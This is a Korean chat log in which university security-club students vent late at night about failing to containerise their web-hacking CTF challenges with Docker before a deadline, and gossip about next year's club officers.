+[송민영] [오후 11:20] 카톡을 안보시는데
+[송민영] [오후 11:20] 자러가신건가
+[김나진] [오후 11:21] 바쁜거 않을까
+[김나진] [오후 11:21] 아닐카
+[김나진] [오후 11:21] 까
+[송민영] [오후 11:21] 그래야 되는데
+[송민영] [오후 11:21] 뭔가 느낌이 자러가신거 같아서
+[송민영] [오후 11:21] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오후 11:21] ㅋㅋㅋㅋㅋㄱㅋㅋㄱㅋㄱㅋㅋ
+[김나진] [오후 11:22] 수요일에 pox 진행할 때 우리문제 빼고 하는거 아닐까..? ㅋㅋㄱㅋㅋㄱㅋㅋ
+[송민영] [오후 11:22] 그냥 그랬으면 좋겠따...ㅎ
+[김나진] [오후 11:23] 최악엔 내일까지도 이러고 있는거네
+[송민영] [오후 11:23] 오늘까지 무조건 제출하라던데
+[송민영] [오후 11:23] 지우가
+[송민영] [오후 11:23] 오늘은 무슨...ㅎ
+[김나진] [오후 11:24] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㄲ
+[송민영] [오후 11:26] 답장이 없으신데
+[송민영] [오후 11:26] 지우가 뭘알지 않을까....
+[송민영] [오후 11:26] 아님 지수언니나...
+[김나진] [오후 11:26] vm 안에서도 안 되긴 해. 그래서 컨테이너로 만들기 전에 필요한게 뭔지 알기 위해(설정파일 등) 먼저 우분투 로컬에서 테스트하고 익스코드 잘 돌아가는지 확인해달라도 했던거야. 우리가 하는 환경 우분투니까 앞으로 윈도우는 생각하지 말고 우분투 환경에서만 해줘. 윈도우에서 환경구축해서 되는거는 진짜 소용없거든...
+[송민영] [오후 11:27] 흠
+[송민영] [오후 11:27] 근데 나도 지금 실행하려니깐
+[송민영] [오후 11:27] 오류 뜨거든
+[송민영] [오후 11:28] 저기 팀도 도커 해결 못했데ㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오후 11:28] 대회날 그냥 두문제가 없을듯ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오후 11:28] ㅋㅋㅋㄱㅋㅋㄱㅋㄱㄱㄱㅋㅋㄱㅋㅋ
+[김나진] [오후 11:28] 우분투 로컬에서 해보려면 bitnami를 설치해야겠지..?
+[송민영] [오후 11:29] 음
+[송민영] [오후 11:29] 안해도 되지 않을까?
+[송민영] [오후 11:29] 잘 모르겠네
+[송민영] [오후 11:29] 해야되나
+[김나진] [오후 11:30] 나 어제 설치하려고 했는데 계속 안되더라고
+[송민영] [오후 11:30] apahce 2 설치하면 된다는데
+[김나진] [오후 11:32] Dockerfile에서 컨테이너 환경구축하는거 그거대로 하면 돼 apache2 php 이런거
+[김나진] [오후 11:32] 라는데
+[송민영] [오후 11:32] 응응
+[송민영] [오후 11:32] 그래서 비트나미 설치 안했어
+[김나진] [오후 11:32] 어떻게....?(도커 설치도 못한 1ㅅ)
+[송민영] [오후 11:33] 그냥 그 apache2가 Dockerfile에서 설치가 되어서
+[송민영] [오후 11:33] 안해도 될걸
+[송민영] [오후 11:33] Dockerfile실행될때
+[송민영] [오후 11:34] conservative-vector.tistory.com/m/99
+[송민영] [오후 11:34] 처럼 하면 되는거 같은데
+[송민영] [오후 11:34] 근디
+[송민영] [오후 11:34] 난 웹사이트가 안뜬단 말이지
+[김나진] [오후 11:35] 난 우선 도커부터 설치를 해야겠네
+[송민영] [오후 11:40] 근디 지윤이는 아직 노트북 안왔나
+[김나진] [오후 11:40] 그러게
+[김나진] [오후 11:41] 노트북 아직 안 왔니
+[김나진] [오후 11:41] 똑똑
+[송민영] [오후 11:45] 아직 안왓나봐
+[남지윤] [오후 11:46] 아
+[남지윤] [오후 11:46] 나
+[남지윤] [오후 11:46] 내일올꺼같아ㅠㅠㅠㅠㅠㅜ
+--------------- 2020년 11월 10일 화요일 ---------------
+[송민영] [오전 12:37] setup.sh 넣으니깐
+[송민영] [오전 12:37] 안되는거 같은데
+[송민영] [오전 12:37] 꼭 넣어야 되는건가
+[김나진] [오전 1:07] 한번 빼볼까..
+[김나진] [오전 1:11] 음
+[김나진] [오전 1:11] 빼니까 에러뜨네
+[송민영] [오전 1:24] 난 둘다 안돼
+[김나진] [오전 1:24] ㄲㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:25] 아 언니 docker-compose up -d --build 명령어 친 다음에 컨테이너 실행하는 거야?
+[송민영] [오전 1:27] 으응
+[김나진] [오전 1:28] 그 다음에는..?
+[송민영] [오전 1:29] 그 다음 docker-compose up
+[송민영] [오전 1:29] 하면 뭐라 뜨잖아
+[김나진] [오전 1:33] 응
+[송민영] [오전 1:35] 거기서 뜨는 ip주소로 접속하면 됐거든
+[송민영] [오전 1:35] 나는ㄷ
+[송민영] [오전 1:35] 근데 그냥 web 구성하는거에서 막혀
+[송민영] [오전 1:35] 지금
+[송민영] [오전 1:36] 지우한테 물어봤는데 답장이 없네
+[김나진] [오전 1:37] 나도 답장이 없어..
+[송민영] [오전 1:37] 알고보니 진짜
+[송민영] [오전 1:37] 6시까지 제출이고
+[송민영] [오전 1:37] 우리는 시간을 넘겨서
+[송민영] [오전 1:37] 답장이 없는건가...
+[송민영] [오전 1:37] ㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:37] 경험삼아 해보렴^^이런건가
+[송민영] [오전 1:37] 그니깐
+[송민영] [오전 1:37] ㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:37] 충분히 그럴 수 있어
+[송민영] [오전 1:37] 소연이가 근데 도커 해결됐다고 했는데
+[김나진] [오전 1:37] 와
+[송민영] [오전 1:37] 재아님도 아무것도 모르고 하는거 아니야
+[송민영] [오전 1:37] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:38] ㅋㅋㅋㅋㅋㅋㅋㄱㅋㄱㅋㅋ
+[김나진] [오전 1:38] 뭘까
+[송민영] [오전 1:38] 사진
+[송민영] [오전 1:38] 이렇게 왔거든
+[송민영] [오전 1:38] 뭘까
+[김나진] [오전 1:38] 해결되면
+[송민영] [오전 1:38] 그러고보니 지수언니도 아무말도 없고
+[김나진] [오전 1:39] 야!우리 끝났어!
+[김나진] [오전 1:39] 자유야!
+[김나진] [오전 1:39] 이럴텐데
+[송민영] [오전 1:39] 사실 아무것도 안되니깐
+[송민영] [오전 1:39] 뭘해야될지 모르겠어
+[김나진] [오전 1:39] 경험^^하라는 건가
+[송민영] [오전 1:39] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:39] 실은 다른 분들이 이미 다 만들어 놓은 거지
+[송민영] [오전 1:39] 경험^^
+[송민영] [오전 1:39] 그니깐
+[송민영] [오전 1:40] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:40] 이럴 줄 알고!
+[송민영] [오전 1:40] 에휴 저희가 그냥 만들게요
+[송민영] [오전 1:40] 역시 학.부.생. 이 뭘하겠습니까
+[송민영] [오전 1:40] 이러면서
+[김나진] [오전 1:40] ㅋㅋㄱㅋㄱㄱㄱㅋㄱㅋㄱㄱㅋㄱㄱㅋ
+[김나진] [오전 1:40] 나 지우언니한테 답 오기 전까지 생코 도커 강의 들으려고
+[송민영] [오전 1:41] 나도 그럴끼
+[송민영] [오전 1:41] 까
+[김나진] [오전 1:41] ㅋㅋㅋㅋㅋㅋㅋㅋㄱㅋㄱㅋㄱㅋ
+[김나진] [오전 1:41] 츄라이츄라이
+[송민영] [오전 1:42] 이렇게 답 안오는거 아냐ㅋㅋㅋㅋㅋ
+[김나진] [오전 1:42] 나중에
+[김나진] [오전 1:42] 얘들아^^실은 너네 문제 파일 내자마자 그분들이 다 해주셨어^*^
+[송민영] [오전 1:42] 근데 우리가 진짜 안되니깐
+[송민영] [오전 1:43] 나도 그생각했는데
+[송민영] [오전 1:43] 소연이가 6시까지 제출이라고 했잖아
+[송민영] [오전 1:43] 그래서
+[송민영] [오전 1:43] 진짜 그럴수도 있겠다 생각햇어
+[송민영] [오전 1:43] 그냥 문제파일만 내기
+[송민영] [오전 1:43] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:43] ㅋㅋㄱㅋㅋㄱㄱㅋㅋㄱㄱㅋㄱㅋ
+[김나진] [오전 1:43] 마음이 편해진다
+[송민영] [오전 1:43] 나도
+[송민영] [오전 1:43] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:43] 어제의 처절함과 자책감이 씻겨 내려간다
+[송민영] [오전 1:44] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 1:44] 내년에도 이짓거리 시키진 않겠지
+[김나진] [오전 1:44] 언니
+[김나진] [오전 1:44] 임원진이야?
+[송민영] [오전 1:44] 응응
+[송민영] [오전 1:44] 나?
+[김나진] [오전 1:44] 응
+[송민영] [오전 1:44] 하겠다고 했는데 후회중
+[김나진] [오전 1:44] ㅋㅋㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋ
+[송민영] [오전 1:44] 하다가 사라질수도 잇어
+[송민영] [오전 1:44] ㅎ
+[김나진] [오전 1:44] 뭐?
+[송민영] [오전 1:44] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:44] 그니까
+[김나진] [오전 1:45] 음
+[김나진] [오전 1:45] 총무라든지 그중에서 뭐야?
+[송민영] [오전 1:45] 나 그
+[송민영] [오전 1:45] 작년에
+[송민영] [오전 1:45] 지금
+[송민영] [오전 1:45] 지수언니가 하는거
+[송민영] [오전 1:45] 이름이 뭐지
+[김나진] [오전 1:45] 학술부장?
+[송민영] [오전 1:45] 응응
+[송민영] [오전 1:45] 너랑같이한다는데
+[김나진] [오전 1:46] 왜... 언니랑 같이 한다고 나한텐 안 알려줬지
+[김나진] [오전 1:46] 지우언니 이번 도커일로 후회하는거 아냐?
+[송민영] [오전 1:46] 나 안할줄 알았나봐ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:46] 얘네가 잘 할 수 있을끼ㅡ...
+[송민영] [오전 1:46] 너 해킹으로 간다했어?
+[김나진] [오전 1:46] 아니?
+[김나진] [오전 1:46] ㅋㅋㅋㄱㅋㄱㅋㄱㅋㄱㅋㅋㅋㄱㄱㄱㄲ
+[송민영] [오전 1:47] 그래?
+[송민영] [오전 1:47] 나 없었으면
+[송민영] [오전 1:47] 너 혼자하는거였네
+[김나진] [오전 1:47] 할줄 아는 거라곤 구글링 뿐
+[송민영] [오전 1:47] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:47] 나 혼자면 학회 폭파야
+[송민영] [오전 1:47] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 1:47] 나 있어도 폭파야
+[송민영] [오전 1:47] 괜찮아
+[김나진] [오전 1:47] 회장은 성주인가?
+[송민영] [오전 1:47] 성주지
+[김나진] [오전 1:47] ㅋㅋㄱㅋㅋㄱㄱㅋㄱㄱㄲ
+[송민영] [오전 1:47] 그냥 내정인거 같던데
+[송민영] [오전 1:47] 성주가 시스템하고 있고
+[김나진] [오전 1:48] ㅋㅋㄱㅋㅋㄱㅋㄱㅋㄱㅋㄱㄲ
+[송민영] [오전 1:48] 인코 프로젝트도 하고
+[송민영] [오전 1:48] 해킹캠프도 갔잖아
+[송민영] [오전 1:48] 부회장은 누굴까
+[김나진] [오전 1:48] 시스 전통인듯
+[송민영] [오전 1:48] 난 총무하고 싶었는데
+[송민영] [오전 1:48] 돈만 관리하는
+[김나진] [오전 1:48] ㅋㅋㄱㅋㅋㄱㄱㅋㄱㄲ
+[김나진] [오전 1:48] 벌금 기록하는ㅋㅋㄱㄱㄲ
+[송민영] [오전 1:48] 총무 있으면 나랑 바꿔주면 좋겠다
+[송민영] [오전 1:48] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:49] 우리 지금 부회장 누구지
+[김나진] [오전 1:49] 기억이 안나네
+[송민영] [오전 1:49] 그
+[송민영] [오전 1:49] 김현주님
+[김나진] [오전 1:49] 아하
+[송민영] [오전 1:49] 근데 내년
+[김나진] [오전 1:49] 시스템이랑 웹 둘다 한 언니
+[송민영] [오전 1:49] 씨스 망하는거 아냐
+[김나진] [오전 1:49] ㅋㅋㅋㄱㅋㄱㅋㄱㅋㅋㄱㅋㅋ
+[송민영] [오전 1:49] 나 해킹 안갈거고
+[송민영] [오전 1:49] 너도 안가고
+[송민영] [오전 1:49] 일단 학술부장이 안감
+[김나진] [오전 1:49] 성주가...  알아서 할 거야...
+[송민영] [오전 1:49] 재작년처럼
+[송민영] [오전 1:50] 회장언니하고 부회장언니가 다 하는건가
+[송민영] [오전 1:50] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:50] ㅋㅋㄱㅋㄱㅋㅋㄱㄱㅋㄱㅋㅋㄱㅋ
+[송민영] [오전 1:50] 재작년 학술부장 선배는 거의 노쇼였잖아
+[송민영] [오전 1:50] 우리도 그렇게 되는거 아냐ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:50] 소연이 언니는 진로 보안쪽 아니었나?
+[송민영] [오전 1:50] 바꿨데
+[송민영] [오전 1:50] 인코 프젝하고나서
+[김나진] [오전 1:50] 진로를 바꿔주는 시스
+[송민영] [오전 1:50] 보안 분야가 엄청나게
+[송민영] [오전 1:50] 인맥빨이고
+[김나진] [오전 1:50] 아 그래?
+[송민영] [오전 1:50] 사람들도 좀 그런가봐
+[김나진] [오전 1:51] 그들만의 리그
+[송민영] [오전 1:51] 보안이 뭐 하는사람이 적으니깐
+[송민영] [오전 1:51] 그렇지 않을까
+[김나진] [오전 1:51] 브ㅡ루 오ㅡ션?
+[김나진] [오전 1:51] 적었구나..
+[송민영] [오전 1:51] 적은데 천재들이 많은듯
+[송민영] [오전 1:51] 그들만의 리그
+[김나진] [오전 1:51] 1학년때 담당굣님하고 상담하잖아
+[송민영] [오전 1:51] 으응
+[송민영] [오전 1:51] 너 누구였어?
+[김나진] [오전 1:52] 광수굣님이 보안 쪽 가지 말랬어
+[송민영] [오전 1:52] 맞아
+[송민영] [오전 1:52] 주희언니도 그 굣님한테 상담받았는데
+[송민영] [오전 1:52] 얼마나 보안이 별로인지를 설명해주셨다고
+[김나진] [오전 1:52] 주희언니 보안 쪽으로 간대?
+[송민영] [오전 1:52] 노노
+[송민영] [오전 1:52] 주희언니 이미 때려쳤지
+[김나진] [오전 1:52] ㅋㅋㅋㄱㄱㅋㄱㅋㄱㅋㄱㄱㅋ
+[송민영] [오전 1:52] 2학년때 이미 때려쳤어
+[송민영] [오전 1:52] 그래서 과제도 한개만 한걸로 알아
+[김나진] [오전 1:52] 아 그랬어?
+[송민영] [오전 1:53] 응응
+[송민영] [오전 1:53] 회장언니한테 나가겠다고 했는데
+[송민영] [오전 1:53] 리눅스 멘토링때문에
+[송민영] [오전 1:53] 안된다고 과제 줄여주겠다고 해서
+[김나진] [오전 1:53] 아앗...
+[송민영] [오전 1:53] 나도 내년에 갑자기 나갈지도 몰라
+[송민영] [오전 1:53] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:53] ㅋㅋㅋㄱㅋㅋㅋㄱㅋㅋㅋㄱㅋ
+[송민영] [오전 1:53] 박영훈 교수님도 보안이잖아
+[김나진] [오전 1:53] 임원진 나가면 어디서 충원하냐
+[송민영] [오전 1:54] 우리 기수 중에서
+[송민영] [오전 1:54] 한명 찍는거지
+[김나진] [오전 1:54] 연락 돌리려나
+[송민영] [오전 1:54] 너 하지 않을래
+[김나진] [오전 1:54] ㅋㅋㅋㄱㅋㅋㄱㅋㅋㅋㅋ
+[송민영] [오전 1:54] 부회장 누굴까
+[송민영] [오전 1:54] 가장 미스터리하다
+[김나진] [오전 1:54] 은영이?
+[송민영] [오전 1:54] 은영일려나
+[김나진] [오전 1:54] 그럴듯하군
+[송민영] [오전 1:54] 시스템하는 사람 누구있지
+[김나진] [오전 1:54] 음...
+[송민영] [오전 1:55] 성주 은영
+[송민영] [오전 1:55] 한명더 있었는데
+[송민영] [오전 1:55] 연진?
+[김나진] [오전 1:55] 어어
+[김나진] [오전 1:55] 맞아
+[송민영] [오전 1:55] 둘중 하나 아닐까
+[김나진] [오전 1:55] 그렇구만
+[김나진] [오전 1:56] 근데 좀 불안한게
+[송민영] [오전 1:56] 응응
+[김나진] [오전 1:56] 과제 내주는 게 항상 똑같지가 않잖아
+[김나진] [오전 1:56] 1학년들은 갑자기 비박스인가 그런거 하고
+[김나진] [오전 1:56] 그런거 시키려면 먼저 다 풀어봐야 하나?
+[송민영] [오전 1:57] 아 안돼
+[송민영] [오전 1:57] 이번에 더 빡세진 느낌
+[송민영] [오전 1:57] 보안으로 가는 임원진이 2명이어서 그런가
+[김나진] [오전 1:57] 뭐 웹해킹 문제 다 풀어봐야 한다든지
+[송민영] [오전 1:57] 우리때는 인경언니만 가서 널널한거고
+[김나진] [오전 1:57] 지수언니랑 지우언니지?
+[송민영] [오전 1:57] 응응
+[김나진] [오전 1:58] 와우
+[송민영] [오전 1:58] 다시 우리때로 돌아가지 않을까..ㅎ
+[송민영] [오전 1:58] 과제양이
+[김나진] [오전 1:58] 행복했던 그 시절..
+[송민영] [오전 1:58] 이번 20학번애들
+[송민영] [오전 1:58] 좀 불쌍해
+[송민영] [오전 1:58] 너무 과제가 많아
+[김나진] [오전 1:58] ㅋㅋㅋㅋㅋㄱㅋㅋㅋㄱㄱㄲ
+[김나진] [오전 1:58] 아직 c한참 배우는 애들이 갑자기
+[김나진] [오전 1:58] 웹.해.킹
+[송민영] [오전 1:58] ㅇㅈㅇㅈ
+[송민영] [오전 1:58] 웹도 잘 모를텐데
+[김나진] [오전 1:58] 선행학습 엄청나
+[송민영] [오전 1:59] 다 빠져나갈거 같은데
+[송민영] [오전 1:59] 이번에
+[김나진] [오전 1:59] 하핫
+[김나진] [오전 1:59] 그럼에도 버티는 아이들이 있겠지
+[송민영] [오전 1:59] 그렇겠지
+[김나진] [오전 1:59] 늘 그래왔듯이
+[송민영] [오전 1:59] 그리고 방학때 또 빠져나가겠지
+[송민영] [오전 1:59] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 1:59] 알면서도 계속 피를 보는..
+[송민영] [오전 2:01] 근데 도커 물어보면
+[송민영] [오전 2:01] 난 답 못할듯
+[송민영] [오전 2:01] 나진아 너가 답해줄거라 믿어
+[김나진] [오전 2:01] 이모티콘
+[김나진] [오전 2:01] 띠요옹
+[송민영] [오전 2:01] 내년에도 문제만드는거 시키지 않겠찌
+[김나진] [오전 2:01] 문제 자체는 괜찮은데
+[김나진] [오전 2:01] 도커가 문제지
+[송민영] [오전 2:02] 맞아
+[송민영] [오전 2:02] 도커하라그러면
+[송민영] [오전 2:02] 나 외국으로 갈게
+[송민영] [오전 2:02] 잠시 좀 없어질게
+[김나진] [오전 2:02] ㅋㅋㅋㅋㄱㅋㅋㅋㅋㄱㅋㅋ
+[김나진] [오전 2:02] 갑작스러운 중도휴학
+[송민영] [오전 2:03] ㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:03] 연락 안됨
+[송민영] [오전 2:03] 12월에 연락되는거지
+[김나진] [오전 2:03] 나 윈도우에 도커 설치하려다가 갑자기 grub 떠서 우분투로 바꿨잖아
+[송민영] [오전 2:03] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:03] 도커까지 하라 그러면
+[송민영] [오전 2:03] 나 진짜 회의에 참여해서
+[송민영] [오전 2:03] 따질거야
+[송민영] [오전 2:03] 어차피 이분야로 안갈거기 때문에
+[김나진] [오전 2:04] 학부생에게 도커가 웬말
+[송민영] [오전 2:04] 그니깐
+[김나진] [오전 2:04] ㅋㅋㅋㅋㅋㄱㅋㅋㄱㄱㅋㅋㅋ
+[송민영] [오전 2:04] 사실
+[송민영] [오전 2:04] 그
+[송민영] [오전 2:04] git
+[송민영] [오전 2:04] 제대로 사용할줄 아는
+[송민영] [오전 2:04] 학부생도 별로 없잖아
+[김나진] [오전 2:04] ㅋㅋㅋㄱㅋㅋㅋㅋㅋㄱㅋ
+[김나진] [오전 2:04] 할줄 아는거
+[송민영] [오전 2:04] 그런 학부생한테 도커?
+[김나진] [오전 2:04] 커밋 풀 머지
+[송민영] [오전 2:04] 그니깐
+[송민영] [오전 2:05] 설마 나는 일리노이 공과대학 수석으로 졸업한 해커지. 난 1학년때 도커를 마스터 했는데 요즘애들도 하겠지 하고
+[송민영] [오전 2:05] 우리한테 시킨거 아냐
+[송민영] [오전 2:05] ㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:05] ㅋㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋㅋ
+[김나진] [오전 2:05] 세상에
+[송민영] [오전 2:05] 가능성있을거 같애
+[송민영] [오전 2:05] 영훈 굣님도 영재고잖아
+[김나진] [오전 2:05] 세상 보는 기준이 너무 협소한걸
+[김나진] [오전 2:05] ...?
+[송민영] [오전 2:05] 영재고 졸업하셨잖아
+[송민영] [오전 2:05] 그굣님
+[김나진] [오전 2:05] 보안하는 인간들은 다들 머리가 좋군
+[송민영] [오전 2:06] ㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:06] 💩멍청이인 나는 어림도 없지
+[송민영] [오전 2:06] 나도
+[송민영] [오전 2:06] 이렇게 있어도 되겠지
+[송민영] [오전 2:07] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:07] 그냥 나 거의 포기한 상태라
+[김나진] [오전 2:07] 나 오늘 새벽에 지우언니한테 익스 코드 보내고
+[김나진] [오전 2:07] 알바가려고 알람을 한ㅅㅣ간 간격으로 2개를 맞췄어
+[송민영] [오전 2:07] 오우
+[송민영] [오전 2:07] 고생했네
+[김나진] [오전 2:08] 첫번째 알람으로 깼을 때 지우언니한테서 톡 와 있으면 다시 노트북 켤려고
+[김나진] [오전 2:08] ㅋㅋㅋㄱㅋㅋㄱㅋㄱㅋㄱㅋㄱㅋ
+[송민영] [오전 2:08] 근데 왜 답이 없지
+[김나진] [오전 2:08] 자나봐
+[송민영] [오전 2:08] 그런가?
+[송민영] [오전 2:08] 근데 12시부터 자나
+[송민영] [오전 2:08] 잘수도 잇지
+[김나진] [오전 2:08] 지우언니 어제 새벽까지도 나랑 톡했는데
+[송민영] [오전 2:08] 나도
+[김나진] [오전 2:08] 회장이면 할 일이 많지 않을까?
+[송민영] [오전 2:08] 근데 지금
+[송민영] [오전 2:08] 우리 안돼서
+[송민영] [오전 2:09] 우리거 확인할텐데
+[송민영] [오전 2:09] 아
+[김나진] [오전 2:09] ?
+[송민영] [오전 2:09] 우리그냥 포기한건가
+[김나진] [오전 2:09] ㅋㅋㅋㄱㅋㅋㅋㄱㅋㅋㅋㅋㅋㄱㅋㄱ
+[송민영] [오전 2:09] 애들 안되나봐요
+[송민영] [오전 2:09] 저희측 그냥 문제 못내겠습니다.
+[송민영] [오전 2:09] 이러고
+[김나진] [오전 2:09] 급격히 어두워지는 시스의 미래
+[송민영] [오전 2:09] 내년에도 문제 만들기 하면
+[송민영] [오전 2:09] 그냥 6명이 한팀되어서
+[송민영] [오전 2:09] 2명이 문제만들고
+[송민영] [오전 2:09] 4명이 도커해야돼
+[김나진] [오전 2:10] 4명ㅋㅋㅋㅋㅋㅋㅋㄱㅋㅋㅋ
+[송민영] [오전 2:10] 11일이 대회지?
+[김나진] [오전 2:10] 응. 내일😊
+[김나진] [오전 2:11] 지금 10일이니깐
+[송민영] [오전 2:11] 그냥 우리가낸 문제파일로 그분들이 도커파일 하신거 같다
+[김나진] [오전 2:11] 그치?
+[송민영] [오전 2:11] 오늘 올려나야 되잖아
+[송민영] [오전 2:11] 응응
+[김나진] [오전 2:11] 그분들은 도가 텄을거야
+[송민영] [오전 2:11] 오늘까지 제출하면
+[김나진] [오전 2:11] 그동안 도커로 만든 문제가 몇갠데
+[송민영] [오전 2:11] 내일 문제 올릴때 오류날수도 있고 그러니깐
+[송민영] [오전 2:12] 맞아
+[송민영] [오전 2:12] 재아님한테 물어볼까
+[김나진] [오전 2:12] 응ㅋㅋㅋㅋㅋ
+[송민영] [오전 2:12] 연락받은거 있냐고
+[김나진] [오전 2:12] ㅋㅋㅋㅋㅋㄱㅋㄱㄱㅋ
+[송민영] [오전 2:13] 지수언니한테도 연락이 없고
+[송민영] [오전 2:13] 대체 뭘까
+[김나진] [오전 2:14] 단체로 속이고 있는거지
+[송민영] [오전 2:14] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:14] 수군수군
+[김나진] [오전 2:14] 단체로 속이는게 더 나은 것 같아
+[송민영] [오전 2:14] 재아님 아무런 애기 못들었다는데
+[김나진] [오전 2:15] ㅋㅋㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋㄱ
+[송민영] [오전 2:15] 아침에 지수님하고 연락했는데 그때도 별말 없으셨어요...!
+[송민영] [오전 2:15] 라는데
+[김나진] [오전 2:15] ....
+[김나진] [오전 2:16] 웹해킹 팀들만 모르는 건가봐
+[송민영] [오전 2:16] 재아님은
+[송민영] [오전 2:16] 문제 제출한것도 모르시는데
+[김나진] [오전 2:16] ??????
+[송민영] [오전 2:16] 팀원들간에 소통이 안된건가
+[김나진] [오전 2:16] 같은 팀이잔하..?
+[송민영] [오전 2:16] 저기 팀은
+[송민영] [오전 2:16] 우리처럼 같이 하는게 아니라
+[송민영] [오전 2:16] 문제따로 도커 따로
+[송민영] [오전 2:16] 배정받아서
+[김나진] [오전 2:16] 배정 받은거야?
+[송민영] [오전 2:16] 응응
+[송민영] [오전 2:17] 재아님은 도커만 맡는데
+[송민영] [오전 2:17] 뭐지
+[김나진] [오전 2:17] 도커가 거의 맨 마지막 아니야?
+[송민영] [오전 2:17] 근데 도커도
+[송민영] [오전 2:17] 문제가 잇어야
+[송민영] [오전 2:17] 하는거 아냐?
+[송민영] [오전 2:17] 뭐지
+[김나진] [오전 2:17] ㅋㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋㅋㄱㄱㄲ
+[송민영] [오전 2:17] 멍멍이판인ㄷ레
+[송민영] [오전 2:17] 진짜
+[송민영] [오전 2:17] 뭐 어떻게 돌아가는거야
+[김나진] [오전 2:17] 하나하나 보면 다 엉망이여
+[김나진] [오전 2:18] php작성할 때가 행복했다
+[송민영] [오전 2:18] 뭐가 어떻게 돌아가는건지 모르겠다
+[송민영] [오전 2:19] 재아님도
+[송민영] [오전 2:19] 아무것도 모르시는듯
+[송민영] [오전 2:19] 여기로 초대해서
+[김나진] [오전 2:19] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㄱㅋㄱㄱㅋ
+[송민영] [오전 2:19] 얘기를 나누고 싶네
+[송민영] [오전 2:19] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:19] ㅋㅋㄱㅋㄱㅋㄱㄱㄱㅋ
+[김나진] [오전 2:19] 진짜 그러고 싶다
+[송민영] [오전 2:20] 물어볼가
+[김나진] [오전 2:20] 응
+[김나진] [오전 2:20] ㅋㅋㄱㅋㅋㄱㄱㅋ
+[송민영] [오전 2:20] 같이 얘기하시겠냐고
+[송민영] [오전 2:20] ㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:20] ㄱㄱ
+[김나진] [오전 2:20] ㅋㅋㄱㅋㄱㅋ
+[송민영] [오전 2:20] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:20] 이게 뭐여ㅋㅋㄱㅋㄱㅋ
+송민영님이 이재아님을 초대하였습니다.
+[송민영] [오전 2:20] 안녕하세용
+[김나진] [오전 2:20] 안녕하세요
+[송민영] [오전 2:20] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:20] ㅋㅋㅋㄱㅋㅋㄱㅋㅋㄱㅋ
+[이재아] [오전 2:20] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ안녕하세요
+[김나진] [오전 2:20] 안녕하시죠?
+[송민영] [오전 2:21] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[이재아] [오전 2:21] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:21] ㅋㅋㅋㅋㅋㅋㄱㅋㄱㅋㅋㅋㄱ
+[김나진] [오전 2:21] 다같이 웹해킹 팀 속이는 것 같아요
+[이재아] [오전 2:21] 아니 제가 어제까지 지수님한테 도커 아직 못했다고
+[이재아] [오전 2:21] 죄송하다고
+[이재아] [오전 2:21] 그랬는데…
+[송민영] [오전 2:22] 저는 소연이한테
+[송민영] [오전 2:22] 다 했다고 그렇게 톡이와서
+[송민영] [오전 2:22] 또 다하신줄알고..
+[송민영] [오전 2:22] 이게 어떻게 돌아가는건지
+[김나진] [오전 2:22] 실은 다 만들어놨는데 그러지 않은척
+[송민영] [오전 2:22] 아하
+[송민영] [오전 2:22] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:22] 진짜 6시 제출이라는거 같으니깐
+[송민영] [오전 2:22] 그냥 경험삼아 해봐라
+[송민영] [오전 2:22] 이미 제출은 지났고
